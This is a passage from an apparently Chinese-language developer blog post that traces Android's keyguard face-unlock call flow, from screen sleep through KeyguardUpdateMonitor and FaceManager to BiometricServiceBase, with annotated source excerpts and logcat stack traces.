class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStartedGoingToSleep</span><span class="params">(<span class="type">int</span> why)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;onStartedGoingToSleep(&quot;</span> + why + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        mDeviceInteractive = <span class="literal">false</span>;</span><br><span class="line">        mGoingToSleep = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 这位置的代码作用具体不知，但放在前面可以解决息屏后又立马使用指纹解锁时：出现1.2s内没反应的问题。</span></span><br><span class="line">        mUpdateMonitor.dispatchKeyguardGoingAway(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// Lock immediately based on setting if secure (user has a pin/pattern/password).</span></span><br><span class="line">        <span class="comment">// This also &quot;locks&quot; the device when not secure to provide easy access to the</span></span><br><span class="line">        <span class="comment">// camera while preventing unwanted input.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">currentUser</span> <span class="operator">=</span> KeyguardUpdateMonitor.getCurrentUser();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">lockImmediately</span> <span class="operator">=</span></span><br><span class="line">                mLockPatternUtils.getPowerButtonInstantlyLocks(currentUser)</span><br><span class="line">                        || !mLockPatternUtils.isSecure(currentUser);</span><br><span class="line">        <span class="type">long</span> <span class="variable">timeout</span> <span class="operator">=</span> getLockTimeout(KeyguardUpdateMonitor.getCurrentUser());</span><br><span class="line">        mLockLater = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">        <span class="comment">//判断是否需要播放锁屏音</span></span><br><span class="line">        <span class="keyword">if</span> (mPendingLock) &#123;</span><br><span class="line">            playSounds(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 使得KeyguardUpdateMonitor可以监听到GoingToSleep</span></span><br><span class="line">    <span class="comment">// KeyguardUpdateMonitor 是Keyguard更新监视器</span></span><br><span class="line">    mUpdateMonitor.dispatchStartedGoingToSleep(why);</span><br><span class="line">    <span class="comment">//通知开始息屏</span></span><br><span class="line">    notifyStartedGoingToSleep();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要分析的是屏幕自己息屏，则重点关注mUpdateMonitor.dispatchStartedGoingToSleep(why)。<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等待屏幕超时息屏，handler会发送 MSG_STARTED_GOING_TO_SLEEP</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatchStartedGoingToSleep</span><span class="params">(<span class="type">int</span> why)</span> &#123;</span><br><span class="line">    mHandler.sendMessage(mHandler.obtainMessage(MSG_STARTED_GOING_TO_SLEEP, why, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 注意：如果说按电源键息屏，handler会发送 MSG_STARTED_WAKING_UP</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatchStartedWakingUp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        mDeviceInteractive = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mHandler.sendEmptyMessage(MSG_STARTED_WAKING_UP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>屏幕超时息屏堆栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState: java.lang.Throwable</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.updateFaceListeningState(KeyguardUpdateMonitor.java:2128)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.updateBiometricListeningState(KeyguardUpdateMonitor.java:2053)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.setKeyguardGoingAway(KeyguardUpdateMonitor.java:575)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.handleKeyguardGoingAway(KeyguardUpdateMonitor.java:1727)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.access$5000(KeyguardUpdateMonitor.java:143)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor$16.handleMessage(KeyguardUpdateMonitor.java:1872)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.os.Looper.loop(Looper.java:223)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.app.ActivityThread.main(ActivityThread.java:7945)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:603)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:947)</span><br><span class="line">12-10 09:43:41.437  1468  1468 V KeyguardUpdateMonitor:         at com.android.keyguard.KeyguardUpdateMonitor.updateFaceListeningState(KeyguardUpdateMonitor.java:2129)</span><br></pre></td></tr></table></figure><p>电源键息屏堆栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState: java.lang.Throwable</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.updateFaceListeningState(KeyguardUpdateMonitor.java:2128)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.updateBiometricListeningState(KeyguardUpdateMonitor.java:2053)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.setKeyguardGoingAway(KeyguardUpdateMonitor.java:575)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.handleKeyguardGoingAway(KeyguardUpdateMonitor.java:1727)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor.access$5000(KeyguardUpdateMonitor.java:143)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.keyguard.KeyguardUpdateMonitor$16.handleMessage(KeyguardUpdateMonitor.java:1872)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.os.Looper.loop(Looper.java:223)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at android.app.ActivityThread.main(ActivityThread.java:7945)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:603)</span><br><span class="line">12-10 09:43:41.437  1468  1468 D updateFaceListeningState:      at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:947)</span><br><span class="line">12-10 09:43:41.437  1468  1468 V KeyguardUpdateMonitor:         at com.android.keyguard.KeyguardUpdateMonitor.updateFaceListeningState(KeyguardUpdateMonitor.java:2129)</span><br></pre></td></tr></table></figure><p>这里通过handler发送消息让：handleStartedGoingToSleep处理<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleStartedGoingToSleep</span><span class="params">(<span class="type">int</span> arg1)</span> &#123;</span><br><span class="line">    checkIsHandlerThread();</span><br><span class="line">    mLockIconPressed = <span class="literal">false</span>;</span><br><span class="line">    clearBiometricRecognized();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mCallbacks.size(); i++) &#123;</span><br><span class="line">        <span class="type">KeyguardUpdateMonitorCallback</span> <span class="variable">cb</span> <span class="operator">=</span> mCallbacks.get(i).get();</span><br><span class="line">        <span class="keyword">if</span> (cb != <span class="literal">null</span>) &#123;</span><br><span class="line">            cb.onStartedGoingToSleep(arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mGoingToSleep = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 更新生物识别（指纹、人脸）</span></span><br><span class="line">    updateBiometricListeningState();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateBiometricListeningState</span><span class="params">()</span> &#123;</span><br><span class="line">    updateFingerprintListeningState();</span><br><span class="line">    updateFaceListeningState();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>updateFaceListeningState()，更新人脸状态。<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateFaceListeningState</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 如果此消息存在，我们不应再次进行身份验证</span></span><br><span class="line">    <span class="keyword">if</span> (mHandler.hasMessages(MSG_BIOMETRIC_AUTHENTICATION_CONTINUE)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mHandler.removeCallbacks(mRetryFaceAuthentication);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">shouldListenForFace</span> <span class="operator">=</span> shouldListenForFace();</span><br><span class="line">    <span class="keyword">if</span> (mFaceRunningState == BIOMETRIC_STATE_RUNNING &amp;&amp; !shouldListenForFace) &#123;</span><br><span class="line">        stopListeningForFace();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mFaceRunningState != BIOMETRIC_STATE_RUNNING &amp;&amp;  shouldListenForFace) &#123;</span><br><span class="line">        <span class="comment">// 在这里开始监听人脸</span></span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        startListeningForFace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>startListeningForFace()<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startListeningForFace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mFaceRunningState == BIOMETRIC_STATE_CANCELLING) &#123;</span><br><span class="line">        setFaceRunningState(BIOMETRIC_STATE_CANCELLING_RESTARTING);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;startListeningForFace()&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> getCurrentUser();</span><br><span class="line">    <span class="keyword">if</span> (isUnlockWithFacePossible(userId)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mFaceCancelSignal != <span class="literal">null</span>) &#123;</span><br><span class="line">            mFaceCancelSignal.cancel();</span><br><span class="line">        &#125;</span><br><span class="line">        mFaceCancelSignal = <span class="keyword">new</span> <span class="title class_">CancellationSignal</span>();</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        mFaceManager.authenticate(<span class="literal">null</span>, mFaceCancelSignal, <span class="number">0</span>,</span><br><span class="line">                mFaceAuthenticationCallback, <span class="literal">null</span>, userId);</span><br><span class="line">        setFaceRunningState(BIOMETRIC_STATE_RUNNING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FaceManager#authenticate()<br><strong>frameworks/base/core/java/android/hardware/face/FaceManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">authenticate</span><span class="params">(<span class="meta">@Nullable</span> CryptoObject crypto, <span class="meta">@Nullable</span> CancellationSignal cancel,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> flags, <span class="meta">@NonNull</span> AuthenticationCallback callback, <span class="meta">@Nullable</span> Handler handler,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (callback == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Must supply an authentication callback&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mPendingFaceAuth != <span class="literal">null</span>) &#123;</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;authentication too frequent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mAuthenticationCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">        mPendingFaceAuth = <span class="keyword">new</span> <span class="title class_">PendingFaceAuth</span>(crypto, cancel, flags, callback, handler, userId);</span><br><span class="line">        Log.w(TAG, <span class="string">&quot;pengding face auth&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        authenticateInternel(crypto, cancel, flags, callback, handler, userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">authenticateInternel</span><span class="params">(CryptoObject crypto, CancellationSignal cancel,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> flags, AuthenticationCallback callback, Handler handler, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cancel != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cancel.isCanceled()) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">&quot;authentication already canceled&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cancel.setOnCancelListener(<span class="keyword">new</span> <span class="title class_">OnAuthenticationCancelListener</span>(crypto));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//mSurface = null;</span></span><br><span class="line">    <span class="comment">//onFaceidStarted();</span></span><br><span class="line">    <span class="keyword">if</span> (mService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            useHandler(handler);</span><br><span class="line">            mAuthenticationCallback = callback;</span><br><span class="line">            mCryptoObject = crypto;</span><br><span class="line">            <span class="type">long</span> <span class="variable">sessionId</span> <span class="operator">=</span> crypto != <span class="literal">null</span> ? crypto.getOpId() : <span class="number">0</span>;</span><br><span class="line">            Trace.beginSection(<span class="string">&quot;FaceManager#authenticate&quot;</span>);</span><br><span class="line">            <span class="comment">/*重点关注*/</span>    </span><br><span class="line">            <span class="comment">// 进行人脸认证  </span></span><br><span class="line">            mService.authenticate(mToken, sessionId, userId, mServiceReceiver,</span><br><span class="line">                    flags, mContext.getOpPackageName());</span><br><span class="line">            <span class="comment">/* UNISOC: Modify for bug1374210 &#123;@ */</span></span><br><span class="line">            <span class="keyword">if</span> (callback != <span class="literal">null</span>) &#123;</span><br><span class="line">                callback.onAuthenticationStarted();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* @&#125; */</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">             <span class="comment">// 省略部分代码......</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Trace.endSection();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FaceService#authenticate()<br><strong>frameworks/base/services/core/java/com/android/server/biometrics/face/FaceService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// Binder call</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">authenticate</span><span class="params">(<span class="keyword">final</span> IBinder token, <span class="keyword">final</span> <span class="type">long</span> opId, <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> IFaceServiceReceiver receiver, <span class="keyword">final</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> String opPackageName)</span> &#123;</span><br><span class="line">    checkPermission(USE_BIOMETRIC_INTERNAL);</span><br><span class="line">    updateActiveGroup(userId, opPackageName);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">restricted</span> <span class="operator">=</span> isRestricted();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">AuthenticationClientImpl</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FaceAuthClient</span>(getContext(),</span><br><span class="line">            mDaemonWrapper, mHalDeviceId, token, <span class="keyword">new</span> <span class="title class_">ServiceListenerImpl</span>(receiver),</span><br><span class="line">            mCurrentUserId, <span class="number">0</span> <span class="comment">/* groupId */</span>, opId, restricted, opPackageName,</span><br><span class="line">            <span class="number">0</span> <span class="comment">/* cookie */</span>, <span class="literal">false</span> <span class="comment">/* requireConfirmation */</span>);</span><br><span class="line">     <span class="comment">/*重点关注*/</span></span><br><span class="line">    authenticateInternal(client, opId, opPackageName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BiometricServiceBase#authenticateInternal()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">authenticateInternal</span><span class="params">(AuthenticationClientImpl client, <span class="type">long</span> opId,</span></span><br><span class="line"><span class="params">            String opPackageName)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">callingUid</span> <span class="operator">=</span> Binder.getCallingUid();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">callingPid</span> <span class="operator">=</span> Binder.getCallingPid();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">callingUserId</span> <span class="operator">=</span> UserHandle.getCallingUserId();</span><br><span class="line">        authenticateInternal(client, opId, opPackageName, callingUid, callingPid, callingUserId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">authenticateInternal</span><span class="params">(AuthenticationClientImpl client, <span class="type">long</span> opId,</span></span><br><span class="line"><span class="params">            String opPackageName, <span class="type">int</span> callingUid, <span class="type">int</span> callingPid, <span class="type">int</span> callingUserId)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!canUseBiometric(opPackageName, <span class="literal">true</span> <span class="comment">/* foregroundOnly */</span>, callingUid, callingPid,</span><br><span class="line">                callingUserId)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Slog.v(getTag(), <span class="string">&quot;authenticate(): reject &quot;</span> + opPackageName);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mHandler.post(() -&gt; &#123;</span><br><span class="line">            mMetricsLogger.histogram(getConstants().tagAuthToken(), opId != <span class="number">0L</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// Get performance stats object for this user.</span></span><br><span class="line">            HashMap&lt;Integer, PerformanceStats&gt; pmap</span><br><span class="line">                    = (opId == <span class="number">0</span>) ? mPerformanceMap : mCryptoPerformanceMap;</span><br><span class="line">            <span class="type">PerformanceStats</span> <span class="variable">stats</span> <span class="operator">=</span> pmap.get(mCurrentUserId);</span><br><span class="line">            <span class="keyword">if</span> (stats == <span class="literal">null</span>) &#123;</span><br><span class="line">                stats = <span class="keyword">new</span> <span class="title class_">PerformanceStats</span>();</span><br><span class="line">                pmap.put(mCurrentUserId, stats);</span><br><span class="line">            &#125;</span><br><span class="line">            mPerformanceStats = stats;</span><br><span class="line">            mIsCrypto = (opId != <span class="number">0</span>);</span><br><span class="line">            <span class="comment">/*重点关注*/</span></span><br><span class="line">            startAuthentication(client, opPackageName);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startAuthentication</span><span class="params">(AuthenticationClientImpl client, String opPackageName)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Slog.v(getTag(), <span class="string">&quot;startAuthentication(&quot;</span> + opPackageName + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">lockoutMode</span> <span class="operator">=</span> getLockoutMode();</span><br><span class="line">        <span class="comment">// getLockoutMode() 判断是否锁定，会返回一个 int 值</span></span><br><span class="line">        <span class="keyword">if</span> (lockoutMode != AuthenticationClient.LOCKOUT_NONE) &#123;</span><br><span class="line">            Slog.v(getTag(), <span class="string">&quot;In lockout mode(&quot;</span> + lockoutMode + <span class="string">&quot;) ; disallowing authentication&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">errorCode</span> <span class="operator">=</span> lockoutMode == AuthenticationClient.LOCKOUT_TIMED ?</span><br><span class="line">                    BiometricConstants.BIOMETRIC_ERROR_LOCKOUT :</span><br><span class="line">                    BiometricConstants.BIOMETRIC_ERROR_LOCKOUT_PERMANENT;</span><br><span class="line">            <span class="keyword">if</span> (!client.onError(getHalDeviceId(), errorCode, <span class="number">0</span> <span class="comment">/* vendorCode */</span>)) &#123;</span><br><span class="line">                Slog.w(getTag(), <span class="string">&quot;Cannot send permanent lockout message to client&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        startClient(client, <span class="literal">true</span> <span class="comment">/* initiatedByClient */</span>);</span><br><span class="line">        <span class="comment">//这里将AuthenticationClient传递进去</span></span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">startClient</span><span class="params">(ClientMonitor newClient, <span class="type">boolean</span> initiatedByClient)</span> &#123;</span><br><span class="line">        <span class="type">ClientMonitor</span> <span class="variable">currentClient</span> <span class="operator">=</span> mCurrentClient;</span><br><span class="line">        <span class="keyword">if</span> (currentClient != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Slog.v(getTag(), <span class="string">&quot;request stop current client &quot;</span> +</span><br><span class="line">                    currentClient.getOwnerString());</span><br><span class="line">            <span class="keyword">if</span> (currentClient <span class="keyword">instanceof</span> InternalEnumerateClient</span><br><span class="line">                    || currentClient <span class="keyword">instanceof</span> InternalRemovalClient) &#123;</span><br><span class="line">                 <span class="comment">// 省略部分代码......</span></span><br><span 